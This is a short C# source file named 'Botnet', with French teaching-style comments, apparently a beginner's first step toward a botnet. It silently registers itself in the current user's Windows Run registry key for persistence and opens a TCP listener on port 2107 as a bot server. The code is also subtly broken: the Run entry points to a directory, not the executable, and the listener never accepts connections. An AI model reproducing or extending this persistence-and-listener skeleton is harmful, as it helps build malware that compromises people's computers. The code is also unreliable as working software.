using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using Microsoft.Win32;
using System.Net.Sockets;
//using System.Windows.Controls;
using System.Threading;
using System.IO;
using System.Reflection;
//using System.Windows.Threading;

namespace Botnet    //espace de nom
{
    class Program   //une classe (dans une classe, il y a des fonctions)
    {
        static void Main(string[] args)  // c'est un main (fonction)
        {
            string path = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            Console.WriteLine(path);

            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue(AppDomain.CurrentDomain.FriendlyName, path);


            Console.WriteLine("coucou je suis le serveur");     //Permet d'écrire sur le console
            Console.ReadKey();      //Va attendre une touchedu clavier pour lancer la suite (Read

            SocketPermission permission;    //SocketPermission est une classe, permission c'est l'objet
            Socket sListener;
            IPEndPoint ipEndPoint;
            Socket handler;

            try
            {
                //détermine les permissions du socket (obligatoire pour un socket)
                permission = new SocketPermission(NetworkAccess.Accept, TransportType.Tcp, "", SocketPermission.AllPorts);

                sListener = null;

                //Permet de passer les exceptions de sécurité
                permission.Demand();

                //Permet de mettre un DNS en IP
                IPHostEntry ipHost = Dns.GetHostEntry("");
                //Prend la 1ere IP stockée dans l'objet ipHost
                IPAddress ipAddr = ipHost.AddressList[0];

                ipEndPoint = new IPEndPoint(ipAddr, 2107);

                //Création du socket
                sListener = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                sListener.Bind(ipEndPoint);

                Console.WriteLine("Serveur démarré...");
                Console.ReadKey();


                Console.WriteLine("Démarrage de l'écoute...");
                //Met le socket en état d'écoute et spécifie
                //le nombre maximum de connexions en attente
                sListener.Listen(10);
                Console.WriteLine("Le serveur écoute sur l'addresse: " + ipEndPoint.Address + " sur le port: " + ipEndPoint.Port);
                Console.ReadKey();

            }
            catch(Exception exc)
            {
                Console.WriteLine(exc.ToString());
                Console.ReadKey();
            }


        }
    }

}
